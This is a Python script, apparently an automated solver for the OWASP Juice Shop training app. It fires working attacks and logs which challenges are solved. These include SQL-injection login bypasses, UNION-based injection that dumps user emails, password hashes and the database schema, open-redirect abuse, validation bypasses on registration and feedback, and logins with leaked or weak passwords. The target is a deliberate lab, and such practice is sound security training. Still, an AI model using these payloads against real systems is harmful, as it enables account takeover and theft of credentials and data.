"""Batch 1: auth, injection, and simple HTTP challenges."""
import harness, json, urllib.parse
from harness import Session, log_attempt, solved_set

DOMAIN = "juice-sh.op"
s = Session()

def L(key, name, approach, ok, detail=""):
    return log_attempt(key, name, approach, ("success" if ok else "failed"), ok, detail)

before = solved_set()
def now_solved(key): return key in solved_set(s)

# ---------- simple HTTP ----------
# Confidential Document
r = s.get("/ftp/acquisitions.md", auth=False)
L("directoryListingChallenge", "Confidential Document",
  "GET /ftp/acquisitions.md (directory listing of /ftp exposes confidential file)",
  r.status_code==200 and "Acquisition" in r.text, f"{r.status_code} {len(r.text)}b")

# Exposed Metrics
r = s.get("/metrics", auth=False)
L("exposedMetricsChallenge", "Exposed Metrics",
  "GET /metrics (Prometheus scrape endpoint left exposed)",
  r.status_code==200 and "process_cpu" in r.text, f"{r.status_code}")

# Security Policy
r = s.get("/.well-known/security.txt", auth=False)
L("securityPolicyChallenge", "Security Policy",
  "GET /.well-known/security.txt",
  r.status_code==200 and "Contact" in r.text, f"{r.status_code}")

# Outdated Allowlist (redirect to deprecated crypto address)
addr = "https://explorer.dash.org/address/Xr556RzuwX6hDhJnZ6tMR1NK4AhFK1g2u" if False else \
       "https://blockchain.info/address/1AbKfgvw9psQ41NbpRpwmm6bSrfnyCdhE"
r = s.get("/redirect?to=" + urllib.parse.quote(addr, safe=""), auth=False)
L("redirectCryptoCurrencyChallenge", "Outdated Allowlist",
  f"GET /redirect?to={addr} (deprecated crypto address still in allowlist)",
  r.status_code in (200,302), f"{r.status_code}")

# Error Handling - try several malformed requests
det=""
for desc, fn in [
    ("malformed JSON body to /api/Users",
     lambda: s.post("/api/Users", auth=False, data="{", headers={"Content-Type":"application/json"})),
    ("string id to /api/BasketItems/xyz",
     lambda: s.get("/api/BasketItems/xyz")),
    ("string id to /rest/basket/xyz",
     lambda: s.get("/rest/basket/xyz")),
]:
    rr = fn()
    det += f"{desc}->{rr.status_code}; "
L("errorHandlingChallenge", "Error Handling",
  "Send malformed JSON body / invalid id to provoke an unhandled error with stack trace",
  now_solved("errorHandlingChallenge"), det)

# ---------- registration ----------
# Empty User Registration
r = s.post("/api/Users", auth=False, json={"email":"","password":""})
L("emptyUserRegistration", "Empty User Registration",
  "POST /api/Users with empty email and password (no server-side validation)",
  now_solved("emptyUserRegistration"), f"{r.status_code}")

# Repetitive Registration (password != passwordRepeat accepted)
r = s.post("/api/Users", auth=False, json={"email":"dry@test.io","password":"abc123","passwordRepeat":"xxxxxx","securityQuestion":{"id":2},"securityAnswer":"a"})
L("passwordRepeatChallenge", "Repetitive Registration",
  "POST /api/Users with passwordRepeat different from password (repeat not enforced server-side)",
  now_solved("passwordRepeatChallenge"), f"{r.status_code}")

# ---------- auth / login ----------
def login_try(key, name, approach, email, password):
    r = s.post("/rest/user/login", auth=False, json={"email":email,"password":password})
    ok = r.status_code==200 and "authentication" in r.text
    tok = r.json()["authentication"]["token"] if ok else None
    L(key, name, approach, now_solved(key) or ok, f"{r.status_code}")
    return tok

login_try("weakPasswordChallenge","Password Strength",
          "Login admin@juice-sh.op with weak password 'admin123'", f"admin@{DOMAIN}","admin123")
login_try("loginAdminChallenge","Login Admin",
          "SQLi login: email = \"' or 1=1--\" logs in as first user (admin)", "' or 1=1--","x")
login_try("loginJimChallenge","Login Jim",
          "SQLi login: email = \"jim@juice-sh.op'--\"", f"jim@{DOMAIN}'--","x")
login_try("loginBenderChallenge","Login Bender",
          "SQLi login: email = \"bender@juice-sh.op'--\"", f"bender@{DOMAIN}'--","x")
login_try("loginRapperChallenge","Login MC SafeSearch",
          "Login mc.safesearch with password 'Mr. N00dles' (revealed in music video)", f"mc.safesearch@{DOMAIN}","Mr. N00dles")
login_try("loginAmyChallenge","Login Amy",
          "Login amy with password 'K1f.....................' (93.83 quadrillion years pwd)", f"amy@{DOMAIN}","K1f.....................")
login_try("loginSupportChallenge","Login Support Team",
          "Login support@juice-sh.op with leaked password", f"support@{DOMAIN}","J6aVjTgOpRs@?5l!Zkq2AYnCE@RF$P")
login_try("oauthUserPasswordChallenge","Login Bjoern",
          "Login bjoern.kimminich@gmail.com with base64(reversed email) as password (OAuth pwd pattern)",
          "bjoern.kimminich@gmail.com","bW9jLmxpYW1nQGhjaW5pbW1pay5ucmVvamI=")

# ---------- SQL injection via search ----------
# User Credentials (UNION)
union = "qwert')) UNION SELECT id, email, password, '4', '5', '6', '7', '8', '9' FROM Users--"
r = s.get("/rest/products/search?q=" + urllib.parse.quote(union), auth=False)
L("unionSqlInjectionChallenge","User Credentials",
  "UNION-based SQLi on /rest/products/search?q= to dump Users (id,email,password)",
  now_solved("unionSqlInjectionChallenge"), f"{r.status_code} rows={r.text.count('@'+DOMAIN)}")

# Database Schema
schema = "qwert')) UNION SELECT sql, '2', '3', '4', '5', '6', '7', '8', '9' FROM sqlite_master--"
r = s.get("/rest/products/search?q=" + urllib.parse.quote(schema), auth=False)
L("dbSchemaChallenge","Database Schema",
  "UNION SELECT sql FROM sqlite_master to leak full DB schema via search",
  now_solved("dbSchemaChallenge"), f"{r.status_code}")

# ---------- feedback-based ----------
# Zero Stars
r = s.post("/api/Feedbacks", auth=False, json={"comment":"Meh","rating":0})
L("zeroStarsChallenge","Zero Stars",
  "POST /api/Feedbacks with rating:0 (frontend enforces min 1, API does not)",
  now_solved("zeroStarsChallenge"), f"{r.status_code}")

# Weird Crypto (mention insecure crypto lib in feedback)
r = s.post("/api/Feedbacks", auth=False, json={"comment":"You should not use z85 / hashids the way you do!","rating":1})
L("weirdCryptoChallenge","Weird Crypto",
  "POST feedback naming an insecure crypto lib (z85/hashids)",
  now_solved("weirdCryptoChallenge"), f"{r.status_code}")

print("\nNewly solved this batch:", sorted(solved_set(s) - before))
